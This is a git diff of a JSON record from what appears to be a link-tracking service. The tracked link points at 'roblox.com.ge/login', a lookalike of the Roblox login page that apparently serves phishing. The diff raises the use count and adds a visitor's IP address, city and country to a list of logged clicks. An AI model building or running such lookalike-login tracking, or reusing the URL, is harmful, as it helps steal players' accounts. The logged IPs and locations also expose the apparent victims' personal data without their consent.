@@ -4,7 +4,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776493139088,
     "status": "active",
-    "useCount": 6,
+    "useCount": 7,
     "createdBy": "system",
     "clicks": [
       {
@@ -54,6 +54,14 @@
         "city": "Altoona",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1776594957856,
+        "ip": "49.43.41.60",
+        "country": "India",
+        "city": "Bhopal",
+        "flag": "🇮🇳",
+        "countryCode": "IN"
       }
     ]
   },
